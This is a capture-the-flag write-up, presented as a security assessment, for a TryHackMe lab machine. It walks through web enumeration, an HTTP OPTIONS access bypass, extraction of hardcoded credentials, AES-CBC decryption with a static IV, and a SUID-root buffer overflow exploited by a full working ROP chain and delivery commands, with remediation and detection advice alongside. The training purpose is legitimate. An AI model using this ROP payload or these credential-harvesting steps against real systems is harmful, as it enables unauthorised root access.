# Security Assessment Report: hc0n Christmas CTF

## Assessment Overview

- **Platform:** TryHackMe
- **Target:** 10.130.129.188
- **Room Type:** Boot2Root (Hard — ~120 min)
- **Date Solved:** 2026-05-07

**Objectives & Status:**

- [x] Enumerate exposed services and discover attack surface
- [x] Obtain SSH credentials and capture **user.txt** flag
- [x] Escalate to root and capture **root.txt** flag

---

## Executive Summary & Key Findings

The hc0n Christmas CTF machine is a deliberately vulnerable Ubuntu 16.04 server combining **web application misconfigurations**, a **mobile APK reversing rabbit-hole**, **AES-CBC encryption with a static IV hidden in a runic image**, and a **stack-based buffer overflow in a SUID-root binary**. Initial foothold was gained by piecing together an SSH password split across two hidden web endpoints and decrypting an encrypted port 8080 service to recover the SSH username. Root access was achieved by exploiting a classic `execve("/bin/sh")` return-oriented programming (ROP) chain against a SUID binary compiled without stack canaries or PIE.

- **Exposed Services:** OpenSSH 7.2p2 (port 22), Apache httpd 2.4.18 (port 80), custom AES-CBC encrypted service (port 8080)
- **Interesting Paths:** `/robots.txt`, `/admin/` (directory listing), `/hide-folders/1/` (method-restricted), `/hide-folders/2/hola` (ELF binary)
- **Credentials Discovered:** `thedarktangent` : `Gf7MRr55n$@#PDuliL`
- **Users Enumerated:** `thedarktangent` (uid 1000), `root` (uid 0)
- **Loot & Flags:**
  - `thm{hc0n_christmas_2019!!!}` — user.txt
  - `thm{3xplo1t_my_m1nd}` — root.txt

---

## Exploitation Chain

1. **Reconnaissance** — Full TCP port scan revealed SSH (22), HTTP (80), and a mystery service on 8080 returning base64-encoded ciphertext. Directory busting exposed `/admin/`, `/hide-folders/`, and `robots.txt`.

2. **Credential Harvesting** — `robots.txt` leaked an administrator username (`administratorhc0nwithyhackme`), a Cicada 3301 reference pointing to `iv.png` for the AES IV, and the `iv.png` file itself. An HTTP `OPTIONS` request to `/hide-folders/1/` bypassed the GET-only restriction to reveal the first half of the SSH password (`Gf7MRr55`). Reversing the `/hide-folders/2/hola` ELF binary with `strings` extracted the second half (`n$@#PDuliL`).

3. **Initial Access (SSH)** — The IV `THEIVFORINGEOAEY` was obtained by translating the Cicada 3301 runic text in `iv.png`. Combined with the secret key derived from the web application's authentication cookie, the port 8080 ciphertext `RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=` was decrypted via AES-CBC-128 to yield the SSH username `thedarktangent`. SSH login succeeded with the assembled password `Gf7MRr55n$@#PDuliL`.

4. **Privilege Escalation** — A SUID-root binary `/home/thedarktangent/hc0n` was discovered. Binary analysis confirmed no stack canary, no PIE, and NX enabled. A 56-byte buffer overflow in `fgets()` was exploited with a ROP chain executing `execve("/bin/sh", NULL, NULL)` via the `syscall` gadget at `0x4005fa`. A trailing newline character (`\n`) appended to the payload was **critical**: `fgets()` reads until newline, and without it, the shell commands were consumed by the overflowed buffer instead of being passed to the spawned shell.

---

## Vulnerability Details

### VULN-01: Sensitive Information Exposure via robots.txt (CWE-200)

- **CWE:** [CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- **CISA KEV Catalog:** [Search KEV for Information Disclosure](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- **GitHub Advisory DB:** [GitHub Advisory Database — Information Disclosure](https://github.com/advisories?query=information+disclosure)
- **OSV.dev:** [OSV — CWE-200](https://osv.dev/list?q=CWE-200)
- **NVD:** [NVD Search — CWE-200](https://nvd.nist.gov/vuln/search/results?form_type=Basic&query=CWE-200)
- **Vulnerable Location:** `http://10.130.129.188/robots.txt`
- **Overview:** The `robots.txt` file, intended only to guide crawlers, explicitly disclosed an administrator username (`administratorhc0nwithyhackme`), a cryptographic hint referencing Cicada 3301, and the existence of `iv.png` containing the AES-CBC initialization vector. This file is world-readable and indexed by search engines in misconfigured production deployments.
- **Impact:** Attackers gained immediate knowledge of administrative account naming conventions, the cryptographic scheme in use, and the location of critical key material — collapsing the reconnaissance phase from hours to minutes.
- **Severity:** High
- **Remediation:**
  - Never place credentials, internal paths, or cryptographic material in `robots.txt`.
  - Use `robots.txt` exclusively for crawler directives (`Disallow`, `Allow`, `Sitemap`).
  - Implement proper access controls on sensitive endpoints rather than relying on "security through obscurity."
  - Audit `robots.txt` content during CI/CD pipelines to flag non-standard entries.
- **Proof of Impact:**
  ```bash
  curl -s http://10.130.129.188/robots.txt
  # Output:
  # Administrator for / is: administratorhc0nwithyhackme
  # remember, remember the famous group 3301 to solve this, the secret IV wait for you!
  # Allow: iv.png
  ```

---

### VULN-02: Directory Listing Enabled on Sensitive Paths (CWE-548)

- **CWE:** [CWE-548 — Exposure of Information Through Directory Listing](https://cwe.mitre.org/data/definitions/548.html)
- **CISA KEV Catalog:** [Search KEV for Directory Listing](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- **GitHub Advisory DB:** [GitHub Advisory Database — Directory Listing](https://github.com/advisories?query=directory+listing)
- **OSV.dev:** [OSV — CWE-548](https://osv.dev/list?q=CWE-548)
- **NVD:** [NVD Search — CWE-548](https://nvd.nist.gov/vuln/search/results?form_type=Basic&query=CWE-548)
- **Vulnerable Location:** `http://10.130.129.188/admin/` and `http://10.130.129.188/hide-folders/`
- **Overview:** Apache's `mod_autoindex` was enabled (or `Options +Indexes` was set), allowing unauthenticated users to browse directory contents. The `/admin/` directory exposed the `app-release.apk` file, while `/hide-folders/` revealed two subdirectories (`1/` and `2/`) containing sensitive credential material.
- **Impact:** Directory indexing bypassed the need for path guessing or further brute-forcing. Attackers could directly observe and download all accessible files without any authentication.
- **Severity:** Medium
- **Remediation:**
  - Disable directory indexing in Apache: `Options -Indexes` in the VirtualHost or directory configuration.
  - Deploy a default `index.html` or `index.php` in each directory to prevent automatic listing.
  - Verify with: `curl -s -I http://<target>/admin/` should return `403 Forbidden`, not `200 OK` with directory listing.
  - Enforce this via CIS Apache Benchmark §1.2 and NIST SP 800-53 AC-3 (Access Enforcement).
- **Proof of Impact:**

  ```bash
  curl -s http://10.130.129.188/admin/
  # Rendered an HTML directory index listing app-release.apk

  curl -s http://10.130.129.188/hide-folders/
  # Rendered an HTML directory index listing subdirectories 1/ and 2/
  ```

---

### VULN-03: HTTP Method-Based Access Control Bypass (CWE-862 / CWE-306)

- **CWE:** [CWE-306 — Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- **CISA KEV Catalog:** [Search KEV for Missing Authentication](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- **GitHub Advisory DB:** [GitHub Advisory Database — Missing Auth](https://github.com/advisories?query=missing+authentication)
- **OSV.dev:** [OSV — CWE-306](https://osv.dev/list?q=CWE-306)
- **NVD:** [NVD Search — CWE-306](https://nvd.nist.gov/vuln/search/results?form_type=Basic&query=CWE-306)
- **Vulnerable Location:** `http://10.130.129.188/hide-folders/1/`
- **Overview:** The web application restricted access to `/hide-folders/1/` for GET requests (returning "Method Not Allowed"), but failed to apply the same restriction to the `OPTIONS` HTTP method. Sending an `OPTIONS` request returned the hidden content — the first half of the SSH password — effectively bypassing the access control.
- **Impact:** A trivial HTTP verb change circumvented the intended security control, exposing credential material that was assumed to be protected.
- **Severity:** High
- **Remediation:**
  - Apply access control checks at the resource/route level, **before** HTTP method dispatch — not inside individual method handlers.
  - Use middleware or a front-controller pattern to enforce authentication for all HTTP methods uniformly.
  - Return `405 Method Not Allowed` only AFTER successful authentication and authorization checks.
  - Test all HTTP methods during security assessments: `GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD, TRACE, CONNECT`.
- **Proof of Impact:**

  ```bash
  # GET returns "Method Not Allowed"
  curl -s http://10.130.129.188/hide-folders/1/

  # OPTIONS bypasses the restriction
  curl -s -X OPTIONS http://10.130.129.188/hide-folders/1/
  # Output: "hax0r :3 you win firts part of the ssh password Gf7MRr55"
  ```

---

### VULN-04: Hardcoded Credentials in Client-Side Binary (CWE-798)

- **CWE:** [CWE-798 — Use of Hard-coded Credentials](https://cwe.mitre.org/data/definitions/798.html)
- **CISA KEV Catalog:** [Search KEV for Hardcoded Credentials](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- **GitHub Advisory DB:** [GitHub Advisory Database — Hardcoded Credentials](https://github.com/advisories?query=hardcoded+credentials)
- **OSV.dev:** [OSV — CWE-798](https://osv.dev/list?q=CWE-798)
- **NVD:** [NVD Search — CWE-798](https://nvd.nist.gov/vuln/search/results?form_type=Basic&query=CWE-798)
- **Vulnerable Location:** `/hide-folders/2/hola` (ELF 64-bit executable, not stripped)
- **Overview:** The `hola` binary at `/hide-folders/2/hola` contained hardcoded string comparisons for authentication: username `stuxnet` and password `n$@#PDuliL`. The binary was compiled without stripping symbols (`not stripped`) and without any obfuscation, making the credentials trivially extractable via `strings`. The source file `hola.c` was referenced in debug symbols, confirming the use of `strcmp()` for credential validation.
- **Impact:** The second half of the SSH password was recovered in seconds with a single `strings` command. No reverse engineering or debugging was required — the binary shipped its own secrets in plaintext.
- **Severity:** Critical
- **Remediation:**
  - Never embed credentials in client-side or downloadable binaries.
  - If authentication against a binary is required, use server-side validation with hashed/salted credentials.
  - Strip debug symbols from production binaries: `strip <binary>` or compile with `-s`.
  - At minimum, use compile-time string obfuscation, but recognize this is NOT a security control — it only raises the bar marginally.
  - Reference: NIST SP 800-53 IA-5 (Authenticator Management), CWE Top 25 #18.
- **Proof of Impact:**
  ```bash
  curl -s http://10.130.129.188/hide-folders/2/hola -o /tmp/hola
  strings /tmp/hola | grep -E "stuxnet|PDuliL"
  # Output:
  # stuxnet
  # n$@#PDuliL
  ```

---

### VULN-05: Predictable Static IV in AES-CBC Encryption (CWE-329)

- **CWE:** [CWE-329 — Generation of Predictable IV with CBC Mode](https://cwe.mitre.org/data/definitions/329.html)
- **CISA KEV Catalog:** [Search KEV for Cryptographic Failures](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- **GitHub Advisory DB:** [GitHub Advisory Database — Cryptographic Issues](https://github.com/advisories?query=cryptographic+failure)
- **OSV.dev:** [OSV — CWE-329](https://osv.dev/list?q=CWE-329)
- **NVD:** [NVD Search — CWE-329](https://nvd.nist.gov/vuln/search/results?form_type=Basic&query=CWE-329)
- **Vulnerable Location:** Port 8080 encrypted service + `iv.png` image file + web application session cookie
- **Overview:** The AES-CBC encryption protecting the SSH username on port 8080 relied on a **static, non-random initialization vector** (`THEIVFORINGEOAEY`) embedded in a PNG image (`iv.png`) via Cicada 3301 runic cipher. In proper AES-CBC implementations, the IV must be cryptographically random and unique per encryption operation. Here, the IV was deterministic, publicly accessible, and reused across all sessions. Additionally, the AES key was derivable from the web application's session cookie, making the entire encryption scheme breakable by any attacker who enumerated both the key (via the cookie) and the IV (via the image).
- **Impact:** The SSH username `thedarktangent` was recovered by decrypting the port 8080 ciphertext with the static IV and derived key, completing the credential pair needed for initial access.
- **Severity:** High
- **Remediation:**
  - Generate a fresh, cryptographically random IV for each encryption operation: `os.urandom(16)` or equivalent.
  - Prepend or transmit the IV alongside the ciphertext — the IV does not need to be secret, only unpredictable.
  - Do not encode IV values in static images, configuration files, or any publicly accessible resource.
  - Use authenticated encryption modes (AES-GCM, ChaCha20-Poly1305) instead of AES-CBC where possible.
  - Store encryption keys in a hardware security module (HSM) or a key management service (KMS); never embed them in application-layer cookies.
  - Reference: NIST SP 800-38A (CBC mode requirements), OWASP Cryptographic Failures (A02:2021).
- **Proof of Concept:**

  ```python
  from Crypto.Cipher import AES
  from Crypto.Util.Padding import unpad
  import base64

  key = b"SEARCHTHESECRETK"      # derived from app cookie
  iv  = b"THEIVFORINGEOAEY"       # extracted from iv.png (Cicada 3301 runic)
  ct  = base64.b64decode("RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=")

  cipher = AES.new(key, AES.MODE_CBC, iv)
  plaintext = unpad(cipher.decrypt(ct), 16)
  print(plaintext)  # b'thedarktangent'
  ```

---

### VULN-06: Stack-Based Buffer Overflow in SUID-Root Binary (CWE-121)

- **CWE:** [CWE-121 — Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)
- **CISA KEV Catalog:** [CISA KEV — Buffer Overflow entries](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
- **GitHub Advisory DB:** [GitHub Advisory Database — Buffer Overflow](https://github.com/advisories?query=buffer+overflow)
- **OSV.dev:** [OSV — CWE-121](https://osv.dev/list?q=CWE-121)
- **NVD:** [NVD Search — CWE-121](https://nvd.nist.gov/vuln/search/results?form_type=Basic&query=CWE-121+buffer+overflow)
- **Vulnerable Location:** `/home/thedarktangent/hc0n` — SUID-root ELF binary (rwsrwsr-x, owner: root)
- **Binary Protections:**
  | Protection | Status | Implication |
  |---|---|---|
  | Stack Canary | **Disabled** | No return address integrity check |
  | PIE | **Disabled** (0x400000) | Fixed addresses for gadgets |
  | NX | **Enabled** | Stack non-executable → ROP required |
  | RELRO | Partial | GOT partially writable |
  | Symbols | **Not stripped** | Function names and structure visible |
- **Root Cause:** The `main()` function allocates a 48-byte stack buffer (`sub rsp, 0x30`) and passes it to `fgets(buf, 0x400, stdin)`. The `fgets()` call allows up to 1024 bytes to be written into the 48-byte buffer — a classic unbounded copy. The saved return address sits at offset 56 (48-byte buffer + 8-byte saved RBP), giving an attacker 968 bytes beyond RIP to chain gadgets.
- **Vulnerable Code Pattern (reconstructed from disassembly):**
  ```c
  // hc0n.c — reconstructed from objdump
  void main() {
      char buf[48];         // rbp-0x30
      setuid(0);            // drop to root if SUID
      puts("What will you be having for dinner !!");
      fgets(buf, 0x400, stdin);  // BUFFER OVERFLOW: 0x400 >> 48
      return;               // leave; ret — return address hijacked here
  }
  ```
- **Impact:** A local unprivileged user (`thedarktangent`) executes arbitrary code in the context of `root` (uid 0), achieving full system compromise. The binary's `setuid(0)` call ensures the spawned `/bin/sh` runs with effective UID 0.
- **Severity:** Critical (CVSS 3.1: 7.8 HIGH — AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
- **Remediation:**
  - Replace `fgets()` with a bounds-aware alternative: `fgets(buf, sizeof(buf), stdin)`.
  - Enable stack canaries: compile with `-fstack-protector-strong`.
  - Enable PIE: compile with `-fPIE -pie`.
  - Enable Full RELRO: `-Wl,-z,relro,-z,now`.
  - Remove the SUID bit unless absolutely necessary. If required, drop privileges immediately after the privileged operation with `seteuid(getuid())`.
  - Apply the principle of least privilege: the binary should not run as root.
  - Run static analysis (SAST) tools like `flawfinder`, `cppcheck`, or `semgrep` against C code before compilation.
  - Reference: CISA KEV catalog lists numerous buffer overflow CVEs actively exploited in the wild (CVE-2023-25717, CVE-2022-42475, etc.) — all compiled without mitigations.
  - CIS Debian/Ubuntu Benchmark §1.6.1 — Ensure address space layout randomization (ASLR) is enabled.
- **Proof of Impact — Final Exploit:**

  ```python
  import struct

  # Verified gadgets at fixed addresses (No PIE)
  pop_rdi = 0x400604   # pop rdi; ret
  pop_rsi = 0x40060d   # pop rsi; ret
  pop_rdx = 0x400616   # pop rdx; ret
  pop_rax = 0x40061f   # pop rax; ret
  syscall = 0x4005fa   # syscall; ret
  binsh   = 0x4006f8   # "/bin/sh" string in .rodata

  payload  = b"A" * 56                        # overflow to RIP
  payload += struct.pack("<Q", pop_rdi)       # rdi = "/bin/sh"
  payload += struct.pack("<Q", binsh)
  payload += struct.pack("<Q", pop_rsi)       # rsi = 0 (argv)
  payload += struct.pack("<Q", 0)
  payload += struct.pack("<Q", pop_rdx)       # rdx = 0 (envp)
  payload += struct.pack("<Q", 0)
  payload += struct.pack("<Q", pop_rax)       # rax = 59 (SYS_execve)
  payload += struct.pack("<Q", 59)
  payload += struct.pack("<Q", syscall)       # execve("/bin/sh", 0, 0)
  payload += b"\n"                            # CRITICAL: terminate fgets()

  # Delivery: (python3 gen_payload.py; cat) | ./hc0n
  # Without the trailing \n, fgets() consumes shell commands.
  ```

  ```bash
  # Execution on target
  cd /home/thedarktangent
  (python3 /tmp/go2.py; cat) | ./hc0n
  # id → uid=0(root)
  # cat /root/root.txt → thm{3xplo1t_my_m1nd}
  ```

---

## Senior-Level Lessons Learned & Analysis

### Strategic Takeaways

1. **Reconnaissance is never linear.** The APK (`app-release.apk`) initially appeared to be the primary attack vector, containing strings like `SEARCHTHESECRETKEY` and `SEARCHTHESECRETIV` that hinted at a Frida-based mobile reversing challenge. In reality, the APK was a **deliberate rabbit-hole** — the key and IV were obtained through entirely different means (web enumeration and image analysis). The takeaway: treat initial hypotheses as provisional; let enumeration data drive the attack path, not assumptions.

2. **`strings` on an unstripped binary is often enough.** The `hola` binary at `/hide-folders/2/hola` was not stripped, contained debug symbols referencing `hola.c`, and used `strcmp()` for plaintext credential comparison. A single `strings` command extracted the second SSH password half in under a second. In a real-world assessment, this maps to embedded firmware, IoT binaries, and thick-client applications where developers mistakenly ship debug builds.

3. **Padding oracle attacks require a genuine oracle.** Significant time was spent attempting a padding oracle attack on the `hcon` session cookie, writing custom Python scripts and using PadBuster. The critical realization — that all 256 IV byte values produced "valid padding" — revealed that the "Invalid padding" error was triggered by **base64 decode failures**, not by PKCS#7 validation. No oracle existed. This is a common CTF trap: the encryption scheme looked CBC-based, but the error pathway was unrelated. The fix was to pivot away from the padding oracle approach entirely and recognize that the cookie's IV was embedded in the cookie itself (prepended), making a padding oracle unnecessary.

4. **Stack alignment and `fgets()` behavior are the subtle killers in binary exploitation.** The exploit chain failed silently multiple times before two non-obvious details were identified: (a) `fgets()` reads until a newline character, causing it to consume not just the 128-byte ROP payload but also all subsequent shell commands piped via stdin — fixed by appending `\n` to the payload; (b) stack alignment for `syscall`-based `execve` required careful analysis of the `main()` epilogue (`leave; ret`) to determine whether an extra `ret` gadget was needed (it was not — the alignment was already correct at the point of overflow).

### Real-World Context & Defense

- **Threat Landscape:** Buffer overflows in SUID binaries remain a top-tier Linux privilege escalation vector, particularly in embedded systems, IoT devices, and legacy enterprise appliances where compiler mitigations are disabled for compatibility. The CISA KEV catalog lists numerous actively exploited buffer overflow CVEs (CVE-2023-25717 in Firefox, CVE-2022-42475 in FortiOS — both exploited in ransomware campaigns) that share the same root cause: missing stack canaries, disabled ASLR/PIE, and unsafe C string functions.

- **Detection Engineering:**
  - **Auditd rules:** Monitor execution of SUID binaries with anomalous arguments or piped input: `-a always,exit -F arch=b64 -S execve -F euid=0 -k suid_execve`.
  - **Sysmon / eBPF:** Detect `syscall` invocations with `rax=59` (execve) originating from non-shell parent processes.
  - **Core dumps:** A segfault in a SUID binary (`hc0n`) should trigger an immediate SIEM alert. Core dumps from SUID processes are a strong indicator of exploitation attempts.
  - **File integrity monitoring (FIM):** Monitor `/root/` directory reads by non-root UIDs — `cat /root/root.txt` executed by uid 1000 with effective uid 0 is only possible via privilege escalation.

- **System Hardening:**
  - **Compiler flags:** Deploy `-fstack-protector-strong`, `-fPIE -pie`, `-Wl,-z,relro,-z,now`, `-D_FORTIFY_SOURCE=2` across all C/C++ build pipelines.
  - **SUID audit:** Run `find / -perm -4000 -type f 2>/dev/null` regularly and justify every SUID binary. Remove the SUID bit from binaries that do not strictly require it.
  - **Apache hardening:** Apply CIS Apache HTTP Server 2.4 Benchmark: disable `Options Indexes`, restrict HTTP methods (`LimitExcept GET POST`), and ensure `ServerTokens Prod` and `ServerSignature Off`.
  - **ASLR:** Verify `kernel.randomize_va_space = 2` (full randomization).
  - **Credential management:** Enforce a secrets management policy (HashiCorp Vault, AWS Secrets Manager). Hardcoded credentials in source code, binaries, or configuration files should trigger CI/CD pipeline failures via pre-commit hooks and secret scanning tools (truffleHog, git-secrets, GitHub secret scanning).

---

## Technical Appendix: Commands Worth Keeping

### Reconnaissance

```bash
# Full TCP port scan with service detection
nmap -sC -sV -p- --min-rate 10000 --max-retries 1 --host-timeout 5m 10.130.129.188

# Directory busting
gobuster dir -u http://10.130.129.188 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -q

# Fetch and inspect web resources
curl -s http://10.130.129.188/robots.txt
curl -s http://10.130.129.188/admin/
curl -s http://10.130.129.188/hide-folders/

# Enumerate HTTP methods on restricted endpoints
curl -s -X OPTIONS http://10.130.129.188/hide-folders/1/ -i
curl -s -X PUT   http://10.130.129.188/hide-folders/1/ -i
curl -s -X PATCH http://10.130.129.188/hide-folders/1/ -i

# Download and triage a binary
curl -s http://10.130.129.188/hide-folders/2/hola -o /tmp/hola
file /tmp/hola
strings /tmp/hola | grep -iE "password|ssh|user|flag|second|part"
chmod +x /tmp/hola && echo -e "stuxnet\nn\$@#PDuliL" | /tmp/hola
```

### Exploitation

```bash
# Extract strings from APK for key material
strings app-release.apk | grep -iE "secret|key|iv|aes|encrypt|password|flag" | sort -u
strings classes.dex | grep -E "^[A-Za-z0-9]{16}$" | sort -u

# Decode base64 ciphertext (port 8080 response)
echo 'RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=' | base64 -d | xxd

# Python AES-CBC decryption
python3 -c "
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64
key = b'SEARCHTHESECRETK'
iv  = b'THEIVFORINGEOAEY'
ct  = base64.b64decode('RwO9+7tuGJ3nc1cIhN4E31WV/qeYGLURrcS7K+Af85w=')
cipher = AES.new(key, AES.MODE_CBC, iv)
print(unpad(cipher.decrypt(ct), 16))
"

# SSH with recovered credentials
sshpass -p 'Gf7MRr55n$@#PDuliL' ssh -o StrictHostKeyChecking=no thedarktangent@10.130.129.188
```

### Privilege Escalation

```bash
# Enumerate SUID binaries and capabilities
find / -perm -4000 -type f 2>/dev/null
sudo -l 2>/dev/null
getcap -r / 2>/dev/null

# Analyze binary protections
python3 -c "
from pwn import *
elf = ELF('./hc0n')
print(f'Canary: {elf.canary}, PIE: {elf.pie}, NX: {elf.execstack}')
print(elf.disasm(elf.symbols['main'], 60))
print(f'PLT: {dict(elf.plt)}')
print(f'/bin/sh @ {hex(next(elf.search(b\"/bin/sh\")))}')
"

# Find ROP gadgets
python3 -c "
from pwn import *
rop = ROP(ELF('./hc0n'))
for reg in ['rax','rdi','rsi','rdx']:
    g = rop.find_gadget([f'pop {reg}', 'ret'])
    if g: print(f'pop {reg}; ret @ {hex(g[0])}')
print(f'syscall @ {hex(rop.find_gadget([\"syscall\", \"ret\"])[0])}')
"

# Build and deliver the ROP payload
python3 -c "
import struct
pop_rdi=0x400604; pop_rsi=0x40060d; pop_rdx=0x400616; pop_rax=0x40061f
syscall=0x4005fa; binsh=0x4006f8
p = b'A'*56
p += struct.pack('<Q',pop_rdi)+struct.pack('<Q',binsh)
p += struct.pack('<Q',pop_rsi)+struct.pack('<Q',0)
p += struct.pack('<Q',pop_rdx)+struct.pack('<Q',0)
p += struct.pack('<Q',pop_rax)+struct.pack('<Q',59)
p += struct.pack('<Q',syscall)+b'\n'
import sys; sys.stdout.buffer.write(p)
" > /tmp/payload.bin

# Execute: critical to use (cat payload; cat) to keep stdin open for shell
(cat /tmp/payload.bin; cat) | ./hc0n
```

---

## Appendix B: Session Narrative — Dead Ends, Pivots, and Breakthroughs

### Phase 1: The APK Rabbit-Hole (30–45 min wasted)

**Initial assumption:** The `app-release.apk` found at `/admin/app-release.apk` (and bundled in the room's evidence) was the primary attack vector. The APK's package name `com.example.a11x256.frida_test` and the DEX strings `SEARCHTHESECRETKEY` and `SEARCHTHESECRETIV` strongly suggested a **Frida dynamic instrumentation challenge**. The hypothesis was:

> "Decompile the APK → find the hardcoded AES key and IV → run the app in an emulator → intercept crypto calls with Frida → extract secrets from memory."

**What was attempted:**

- Tried to install `jadx` (apt failed — no root, pipx failed — no jadx on PyPI), `apktool` (pip install failed), and `dex2jar` (not available) to decompile `classes.dex`.
- Attempted to extract key/IV values from `classes.dex` using `strings` with grep patterns for 16-byte base64 and hex strings — returned hundreds of false positives from AndroidX support library strings.
- Manually carved the DEX file looking for string constants near `SEARCHTHESECRETKEY` — no usable values found.
- Attempted to install an Android emulator — not feasible in the environment.

**The pivot:** Realized the APK was a **red herring** when the web enumeration revealed a completely independent credential recovery path (`robots.txt` → `iv.png`, `/hide-folders/`). The APK strings `SEARCHTHESECRETKEY` and `SEARCHTHESECRETIV` were **hints about what to search for on the web server**, not literal values to extract from the DEX. The key was the literal string `SEARCHTHESECRETKEY` (truncated to 16 bytes), and the IV was in the image.

**Lesson:** When a binary artifact and web services coexist, enumerate both independently. Don't fixate on the binary just because reversing seems "more interesting." The web path yielded all credential material in under 15 minutes.

---

### Phase 2: The Padding Oracle That Wasn't (20–30 min wasted)

**The trap:** The web application used an `hcon` cookie that appeared to be AES-CBC encrypted with a prepended IV. The presence of distinct error messages — "Invalid padding" (15 bytes) vs. "User not found" (1991 bytes) — looked exactly like a textbook **padding oracle**.

**What was attempted:**

- Wrote a custom Python padding oracle attack script that modified the IV byte-by-byte to decrypt the cookie.
- The script **consistently** returned intermediate bytes forming the pattern `10 0f 0e 0d ... 01` — a perfect descending sequence that corresponds to valid PKCS#7 padding values. This is the classic **false positive signature** of a padding oracle attack where the oracle is not actually checking padding.
- Cloned and ran **PadBuster** (`padBuster.pl`), which also produced clean-looking but incorrect results.
- Tried multiple verification strategies: flipping additional bytes, using different base values for earlier bytes, verifying each candidate — all 256 guesses for every byte position returned "valid."

**The breakthrough:** A diagnostic test revealed the truth:

```python
# Test: does ANY IV byte value cause "Invalid padding"?
for guess in range(256):
    test_iv[15] = guess
    # ALL 256 returned "valid" — impossible for real PKCS#7
```

Then the definitive test:

```python
# Random IV + our valid CT → "User not found" (padding OK)
# Random IV + random CT   → "Invalid padding" (15 bytes)
```

This proved that the "Invalid padding" error came from **base64 decode failure**, not from AES padding validation. The random CT probably contained bytes that, when base64-decoded, produced invalid UTF-8 or failed some other validation. The "padding" in the error message referred to base64 padding (`=` signs), not PKCS#7.

**The pivot:** Abandoned padding oracle entirely. Used the known IV (`THEIVFORINGEOAEY`) and the key derived from the APK string (`SEARCHTHESECRETK`) to directly decrypt the port 8080 ciphertext, yielding the SSH username. The cookie format turned out to simply be `base64(IV + AES_CBC_encrypt(username))` — the IV was already provided in the cookie itself.

**Lesson:** Always validate your oracle with a control experiment before investing time in an attack. Send random ciphertext and verify that the error response is genuinely about cryptographic padding, not about input encoding or another validation layer.

---

### Phase 3: The Silent Shell (15–20 min of debugging)

**The problem:** The ROP chain was structurally correct — all gadgets verified, the stack layout was sound — but the spawned shell never produced output. Running the exploit produced either a segfault or silence.

**Root cause 1 — `fgets()` buffering behavior:**

`fgets(buf, size, stream)` reads until one of:

1. A newline character (`\n`) is encountered
2. `size - 1` bytes have been read
3. EOF is reached

The 128-byte ROP payload contained no newline character (the struct.pack values `0x400604`, `0x4006f8`, etc. don't contain `0x0a`). Since `0x400` (1024) > 128, `fgets` continued reading past the payload, consuming the shell commands that were supposed to reach `/bin/sh`.

**Fix:** Appended `\n` to the payload:

```python
payload += b"\n"  # terminates fgets() leaving shell commands in the pipe
```

**Root cause 2 — stdin persistence:**

Even with the newline fix, the shell would spawn and immediately exit because stdin reached EOF after the payload was consumed. The `(python3 gen.py; cat) | ./hc0n` pattern was essential: after Python exits, `cat` continues reading from the SSH connection's stdin (the heredoc), keeping the pipe open for the shell to read commands.

**Breakthrough moment:** The output `uid=0(root) gid=1000(thedarktangent)` appeared in the terminal — the ROP chain had worked all along; it was just the I/O plumbing that was broken.

**Lesson:** Binary exploitation toolchain failures are rarely about the gadget chain itself. The three most common silent-failure causes are: (1) I/O buffering mismatches between the exploit generator and the vulnerable binary, (2) stdin/stdout pipe lifecycle management, and (3) stack alignment for `syscall`-based execution. Debug these first.

---

### Summary Timeline

| Phase                                      | Time Spent | Outcome                                |
| ------------------------------------------ | ---------- | -------------------------------------- |
| Recon (nmap, gobuster, web crawl)          | ~10 min    | Ports, paths, robots.txt discovered    |
| APK rabbit-hole                            | ~30–45 min | Abandoned — no decompiler, no emulator |
| Padding oracle dead-end                    | ~20–30 min | Abandoned — no oracle existed          |
| Credential assembly (hide-folders, iv.png) | ~15 min    | SSH username + password obtained       |
| SSH access + user flag                     | ~5 min     | `thm{hc0n_christmas_2019!!!}`          |
| Binary analysis + ROP chain development    | ~15 min    | Gadgets identified, exploit written    |
| I/O debugging (fgets newline, cat trick)   | ~15–20 min | Shell obtained, root flag captured     |

**Total active time:** ~2 hours
**Total dead-end time:** ~60–75 minutes (APK + padding oracle)
**Key insight:** The two longest phases (APK reversing and padding oracle) were **completely unnecessary**. Direct web enumeration and known-ciphertext decryption solved the room in under 30 minutes of effective work.
